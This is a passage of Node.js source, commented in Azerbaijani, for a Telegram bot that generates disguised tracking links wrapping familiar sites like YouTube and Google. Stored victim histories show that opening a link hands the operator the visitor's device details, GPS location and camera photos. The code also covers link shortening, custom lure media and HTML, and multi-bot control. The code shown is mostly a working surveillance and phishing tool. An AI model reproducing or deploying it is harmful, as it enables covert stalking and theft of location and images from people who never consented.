      // Əvvəlki mesajı sil, yeni mesaj göndər
      botInstance.deleteMessage(chatId, msgId).catch(() => {});
      
      let msgText = `📋 *İstifadəçi geçmişi*\n\n`;
      
      for (let i = 0; i < Math.min(history.length, 20); i++) {
        const entry = history[i];
        const time = new Date(entry.timestamp).toLocaleString('az');
        msgText += `*#${i + 1}* — ${time}\n`;
        if (entry.type === 'device_info') {
          msgText += `📱 *Cihaz məlumatları*\n`;
        } else if (entry.type === 'location') {
          msgText += `📍 *Məkan:* [Xəritədə bax](https://www.google.com/maps?q=${entry.lat},${entry.lon})\n`;
        } else if (entry.type === 'image') {
          msgText += `📷 *Şəkil*\n`;
        }
        msgText += `\n`;
      }

      if (history.length > 20) {
        msgText += `... və daha ${history.length - 20} qeyd\n`;
      }

      botInstance.sendMessage(chatId, msgText, {
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify(userHistoryKeyboard(uid))
      }).catch(() => {});

      // Şəkilləri ayrıca göndər
      for (let i = 0; i < history.length; i++) {
        const entry = history[i];
        if (entry.type === 'image' && entry.file) {
          try {
            const imgPath = path.join(IMG_DIR, entry.file);
            if (fs.existsSync(imgPath)) {
              botInstance.sendPhoto(chatId, imgPath, {
                caption: `📷 Şəkil #${i + 1} — ${new Date(entry.timestamp).toLocaleString('az')}`
              }).catch(() => {});
            }
          } catch (_) {}
        }
      }

      return;
    }

    // Tarixçəni sil
    if (data.startsWith('user:histdel:')) {
      const uid = data.split(':')[2];
      if (store.userHistory[uid]) {
        // Şəkil fayllarını təmizlə
        for (const entry of store.userHistory[uid]) {
          if (entry.type === 'image' && entry.file) {
            try {
              const fp = path.join(IMG_DIR, entry.file);
              if (fs.existsSync(fp)) fs.unlinkSync(fp);
            } catch (_) {}
          }
        }
        delete store.userHistory[uid];
        saveStore();
      }
      botInstance.answerCallbackQuery(cbq.id, { text: '✅ Tarixçə silindi', show_alert: true });
      return botInstance.editMessageText(
        `📋 *İstifadəçi geçmişi*\n\n✅ Tarixçə tamamilə silindi.`,
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(userHistoryKeyboard(uid))
        }
      ).catch(() => {});
    }

    // ── Toplu mesaj ────────────────────────────────────────
    
    if (data === 'panel:broadcast') {
      setState(chatId, { action: 'awaitBroadcast' });
      botInstance.sendMessage(chatId,
        '📢 *Toplu mesaj*\n\nİstənilən formatda məlumat göndərin (mətn, şəkil, video, səs, fayl...).\n\nMesaj bütün istifadəçilərə göndəriləcək.\n_(Ləğv etmək üçün /66 yazın)_',
        { parse_mode: 'Markdown' }
      );
      return;
    }
    // ── Deaktiv mesaj paneli ──────────────────────────────

    if (data === 'panel:deactivate') {
      const ds = store.deactivateSettings || {};
      const hasCustomText = ds.customText && ds.customText.length > 0;
      const hasMedia = ds.mediaType && ds.mediaFile;
      let info = '🔴 *Deaktiv mesaj cari vəziyyət*\n\n';
      if (hasMedia) {
        info += `📎 Media: ${ds.mediaFile}\n`;
      } else if (hasCustomText) {
        info += `✏️ Mətn: ` + '\`' + ds.customText.substring(0, 50) + (ds.customText.length > 50 ? '...' : '') + '\`' + `\n`;
      } else {
        info += '📄 Default mətn istifadə olunur\n';
      }
      return botInstance.editMessageText(info, {
        chat_id: chatId, message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify(deactivateMainKeyboard())
      }).catch(() => {});
    }

    // Mətn əlavə et / dəyiş
    if (data === 'deact:settext') {
      setState(chatId, { action: 'awaitDeactText' });
      botInstance.sendMessage(chatId,
        '✏️ *Deaktiv mesajı üçün mətn göndərin*\n\nBoş mesaj göndərsəniz default mətn istifadə olunacaq.\n_(Ləğv etmək üçün /66 yazın)_',
        { parse_mode: 'Markdown' }
      );
      return;
    }

    // Media seçim paneli
    if (data === 'deact:setmedia') {
      return botInstance.editMessageText(
        '🖼 *Media seçin*\n\nHansı media faylını deaktiv səhifədə göstərmək istəyirsiniz?\n_(Fayllar panelindən əvvəl yükləməlisiniz)_',
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(deactivateMediaKeyboard())
        }
      ).catch(() => {});
    }

    // Media seç
    if (data.startsWith('deact:media:')) {
      const fname = data.split(':')[2];
      const dir = path.join(__dirname, 'view');
      const fp = path.join(dir, fname);
      if (!fs.existsSync(fp)) {
        botInstance.answerCallbackQuery(cbq.id, { text: '❌ Fayl mövcud deyil', show_alert: true });
        return;
      }
      let mediaType = null;
      if (fname === 'photo.png') mediaType = 'photo';
      else if (fname === 'video.mp4') mediaType = 'video';
      else if (fname === 'custom.html') mediaType = 'html';
      
      store.deactivateSettings.mediaType = mediaType;
      store.deactivateSettings.mediaFile = fname;
      // Mətn varsa saxla, yoxsa sil
      if (store.deactivateSettings.customText && store.deactivateSettings.customText.length === 0) {
        delete store.deactivateSettings.customText;
      }
      saveStore();
      
      botInstance.answerCallbackQuery(cbq.id, { text: `✅ Media seçildi: ${fname}`, show_alert: true });
      // Panelə qayıt
      const ds = store.deactivateSettings;
      let info = '🔴 *Deaktiv mesaj cari vəziyyət*\n\n';
      info += `📎 Media: ${ds.mediaFile}\n`;
      return botInstance.editMessageText(info, {
        chat_id: chatId, message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify(deactivateMainKeyboard())
      }).catch(() => {});
    }

    // Deaktiv mesajı sıfırla (default-a qayıt)
    if (data === 'deact:reset') {
      store.deactivateSettings = {};
      saveStore();
      botInstance.answerCallbackQuery(cbq.id, { text: '✅ Default mesaj bərpa edildi', show_alert: true });
      return botInstance.editMessageText(
        '🔴 *Deaktiv mesaj cari vəziyyət*\n\n📄 Default mətn istifadə olunur',
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(deactivateMainKeyboard())
        }
      ).catch(() => {});
    }
  });

  botInstance.on('polling_error', (err) => {
    if (err.code === 'ETELEGRAM' && err.message.includes('409')) return;
    console.error(`❌ Telegram xətası: [${err.code}] ${err.message}`);
  });
}

// ═══════════════════════════════════════════════════════════
//  FAYL UPLOAD HANDLERS
// ═══════════════════════════════════════════════════════════

async function downloadFile(botInstance, fileId, destPath) {
  const fileInfo = await botInstance.getFile(fileId);
  const fileUrl  = `https://api.telegram.org/file/bot${botInstance.token}/${fileInfo.file_path}`;
  const res      = await fetch(fileUrl);
  const buf      = await res.buffer();
  fs.writeFileSync(destPath, buf);
}

async function handleVideo(botInstance, chatId, msg) {
  try {
    botInstance.sendMessage(chatId, '⏳ Video yüklənir...');
    const dest = path.join(__dirname, 'view', 'video.mp4');
    // Remove competing media files
    ['photo.png', 'animate.gif'].forEach(f => {
      const fp = path.join(__dirname, 'view', f);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    });
    await downloadFile(botInstance, msg.video.file_id, dest);
    botInstance.sendMessage(chatId, '✅ Video yükləndi! Artıq linklərinizdə görünəcək.');
  } catch (e) {
    botInstance.sendMessage(chatId, `❌ Video xətası: ${e.message}`);
  }
}

async function handlePhoto(botInstance, chatId, msg) {
  try {
    botInstance.sendMessage(chatId, '⏳ Şəkil yüklənir...');
    const dest   = path.join(__dirname, 'view', 'photo.png');
    const photos = msg.photo;
    const best   = photos[photos.length - 1];
    // Remove competing media files
    ['video.mp4', 'animate.gif'].forEach(f => {
      const fp = path.join(__dirname, 'view', f);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    });
    await downloadFile(botInstance, best.file_id, dest);
    botInstance.sendMessage(chatId, '✅ Şəkil yükləndi! Artıq linklərinizdə görünəcək.');
  } catch (e) {
    botInstance.sendMessage(chatId, `❌ Şəkil xətası: ${e.message}`);
  }
}

async function handleHtml(botInstance, chatId, msg) {
  try {
    botInstance.sendMessage(chatId, '⏳ HTML faylı yüklənir...');
    // index.html sistem faylıdır, toxunulmur — custom.html kimi saxla
    const dest = path.join(__dirname, 'view', 'custom.html');
    await downloadFile(botInstance, msg.document.file_id, dest);
    botInstance.sendMessage(chatId, '✅ HTML yükləndi! Artıq linklərinizdə açılacaq.');
  } catch (e) {
    botInstance.sendMessage(chatId, `❌ HTML xətası: ${e.message}`);
  }
}

// ═══════════════════════════════════════════════════════════
//  LİNK YARATMA
// ═══════════════════════════════════════════════════════════

// Template linklər
const TEMPLATE_LINKS = [
  { text: '▶️ YouTube', url: 'https://youtube.com' },
  { text: '🔍 Google', url: 'https://google.com' },
  { text: '📘 Facebook', url: 'https://facebook.com' },
  { text: '🐦 Twitter', url: 'https://twitter.com' },
  { text: '📸 Instagram', url: 'https://instagram.com' },
  { text: '🌐 Example', url: 'https://example.com' }
];

function createNew(botInstance, cid) {
  // Sadəcə templateləri göstər (state SET EDİLMİR)
  const templateRows = [];
  for (let i = 0; i < TEMPLATE_LINKS.length; i += 2) {
    const row = [];
    row.push({ text: TEMPLATE_LINKS[i].text, callback_data: `tmpl:${i}` });
    if (i + 1 < TEMPLATE_LINKS.length) {
      row.push({ text: TEMPLATE_LINKS[i + 1].text, callback_data: `tmpl:${i + 1}` });
    }
    templateRows.push(row);
  }
  templateRows.push([{ text: "✏️ Custom (öz linkinizi yazın)", callback_data: "custom:url" }]);
  botInstance.sendMessage(cid, "🌐 *Link yarat*\n\nTemplate linklərdən birini seçin və ya ✏️ Custom düyməsinə basaraq öz linkinizi yazın:", {
    parse_mode: "Markdown",
    reply_markup: JSON.stringify({
      inline_keyboard: templateRows
    })
  });
}
async function createLink(botInstance, cid, text) {
  const isURL      = /^https?:\/\/.+/i.test((text || '').trim());
  const hasUnicode = [...(text || '')].some(c => c.charCodeAt(0) > 127);

  if (!isURL || hasUnicode) {
    await botInstance.sendMessage(cid, '⚠️ Zəhmət olmasa https:// ilə başlayan düzgün URL göndərin.');
    return createNew(botInstance, cid);
  }

  const host = runtimeHost;
  if (!host) {
    return botInstance.sendMessage(cid,
      '⚠️ *Host URL hələ müəyyən edilməyib.*\n\n' +
      '`bot.js` faylında domain sahəsini doldurun:\n' +
      '`domain: "https://sizin-site.com"`',
      { parse_mode: 'Markdown' }
    );
  }

  const uid  = cid.toString(36);
  const enc  = b64Encode(text.trim());
  const cUrl = `${host}/c/${uid}/${enc}`;
  const wUrl = `${host}/w/${uid}/${enc}`;

  // chatId → bot mapping
  chatBotMap[cid] = botInstance;

  const markup = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [{ text: '🔗 Yeni Link Yarat', callback_data: 'crenew' }],
        [{ text: '🔴 Deaktiv et', callback_data: `deact:${uid}:${enc}` }]
      ]
    })
  };

  botInstance.sendChatAction(cid, 'typing');

  if (USE_SHORTENER) {
    try {
      const [rx, ry] = await Promise.all([
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(r => r.json()),
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(r => r.json())
      ]);
      return botInstance.sendMessage(cid,
        `✅ *Linklər hazırdır!*\n🔗 URL: ${text}\n\n` +
        `🔵 *Cloudflare*\n${Object.values(rx).join('\n')}\n\n` +
        `🟢 *Webview*\n${Object.values(ry).join('\n')}`,
        { parse_mode: 'Markdown', ...markup }
      );
    } catch (_) {}
  }

  botInstance.sendMessage(cid,
    `✅ *Linklər hazırdır!*\n` +
    `🔗 URL: ${text}\n\n` +
    `🔵 *Cloudflare Link*\n${cUrl}\n\n` +
    `🟢 *Webview Link*\n${wUrl}`,
    { parse_mode: 'Markdown', ...markup }
  );
}

// ═══════════════════════════════════════════════════════════
//  ƏLAVƏ BOT ƏLAVƏ ETMƏ
// ═══════════════════════════════════════════════════════════

const activeBotInstances = [];

function launchExtraBot(token) {
  try {
    const instance = new TelegramBot(token, { polling: true });
    setupBotHandlers(instance);
    activeBotInstances.push({ token, instance });
    console.log(`🤖 Əlavə bot aktiv: ${shortToken(token)}`);
    return instance;
  } catch (e) {
    console.error(`❌ Əlavə bot xətası [${shortToken(token)}]: ${e.message}`);
    return null;
  }
}

async function addExtraBot(botInstance, chatId, token) {
  if (!token || token.length < 20) {
    return botInstance.sendMessage(chatId, '❌ Token düzgün deyil. Yenidən cəhd edin.');
  }

  // Token artıq varmı?
  const existing = store.extraBots.find(b => b.token === token);
  if (existing || token === config.TOKEN) {
    return botInstance.sendMessage(chatId, '⚠️ Bu token artıq əlavə edilib.');
  }

  // Token valid yoxla
  try {
    const testBot = new TelegramBot(token, { polling: false });
    const me      = await testBot.getMe();
    store.extraBots.push({ token });
    saveStore();
    launchExtraBot(token);
    botInstance.sendMessage(chatId,
      `✅ Bot əlavə edildi və aktivdir!\n\n🤖 *@${me.username}*\n\`${shortToken(token)}\``,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    botInstance.sendMessage(chatId, `❌ Token yoxlanışı uğursuz oldu:\n${e.message}`);
  }
}


// ═══════════════════════════════════════════════════════════
//  TOPLU MESAJ GÖNDƏR
// ═══════════════════════════════════════════════════════════


async function handleDeactText(botInstance, chatId, msg) {
  const text = (msg.text || '').trim();
  if (text.length === 0) {
    // Boş mesaj -> default-a qayıt
    store.deactivateSettings = {};
    saveStore();
    return botInstance.sendMessage(chatId, '✅ Default mesaj bərpa edildi');
  }
  
  store.deactivateSettings.customText = text;
  // Media varsa saxla
  saveStore();
  
  await botInstance.sendMessage(chatId, `✅ Deaktiv mesajı yeniləndi:\n` + '\`' + text.substring(0, 100) + (text.length > 100 ? '...' : '') + '\`', { parse_mode: 'Markdown' });
}

async function handleBroadcast(botInstance, senderChatId, msg) {
  const users = store.users;
  const userIds = Object.keys(users);
  
  if (userIds.length === 0) {
    return botInstance.sendMessage(senderChatId, '❌ Heç bir istifadəçi yoxdur.');
  }

  await botInstance.sendMessage(senderChatId, `📢 Mesajınız ${userIds.length} istifadəçiyə göndərilir...`);

  let sent = 0;
  let failed = 0;

  for (const uid of userIds) {
    const chatIdInt = parseInt(uid, 36);
    if (isNaN(chatIdInt)) continue;
    if (chatIdInt === senderChatId) continue; // Göndərəni atla
    if (users[uid]?.banned) continue; // Banlanmışları atla

    try {
      // Mesaj tipinə görə yönləndir
      if (msg.text) {
        await botInstance.sendMessage(chatIdInt, msg.text);
      } else if (msg.photo) {
        const photo = msg.photo[msg.photo.length - 1];
        await botInstance.sendPhoto(chatIdInt, photo.file_id, {
          caption: msg.caption || ''
        });
      } else if (msg.video) {
        await botInstance.sendVideo(chatIdInt, msg.video.file_id, {
          caption: msg.caption || ''
        });
      } else if (msg.document) {
        await botInstance.sendDocument(chatIdInt, msg.document.file_id, {
          caption: msg.caption || ''
        });
      } else if (msg.audio) {
        await botInstance.sendAudio(chatIdInt, msg.audio.file_id, {
          caption: msg.caption || ''
        });
      } else if (msg.voice) {
        await botInstance.sendVoice(chatIdInt, msg.voice.file_id);
      } else if (msg.video_note) {
        await botInstance.sendVideoNote(chatIdInt, msg.video_note.file_id);
      } else if (msg.sticker) {
        await botInstance.sendSticker(chatIdInt, msg.sticker.file_id);
      } else if (msg.animation) {
        await botInstance.sendAnimation(chatIdInt, msg.animation.file_id, {
          caption: msg.caption || ''
        });
      } else {
        await botInstance.sendMessage(chatIdInt, '📢 Yeni mesaj (format dəstəklənmədi)');
      }
      sent++;
    } catch (e) {
      failed++;
    }
    
    // Rate limiting - bir az gözlə
    if (sent % 10 === 0) {
      await new Promise(r => setTimeout(r, 1000));
    }
  }

  await botInstance.sendMessage(senderChatId, 
    `✅ *Toplu mesaj tamamlandı!*\n📨 Göndərildi: ${sent}\n❌ Uğursuz: ${failed}\n👥 Cəmi istifadəçi: ${userIds.length}`,
    { parse_mode: 'Markdown' }
  );
}

// ═══════════════════════════════════════════════════════════
//  MAIN BOT
// ═══════════════════════════════════════════════════════════
const mainBot = new TelegramBot(config.TOKEN, { polling: true });
setupBotHandlers(mainBot);

// Saxlanılmış əlavə botları başlat
store.extraBots.forEach(b => launchExtraBot(b.token));

// ═══════════════════════════════════════════════════════════
//  SERVER BAŞLAT
// ═══════════════════════════════════════════════════════════
app.listen(config.PORT, () => {
  console.log(`🚀  Server işləyir — Port: ${config.PORT}`);
});
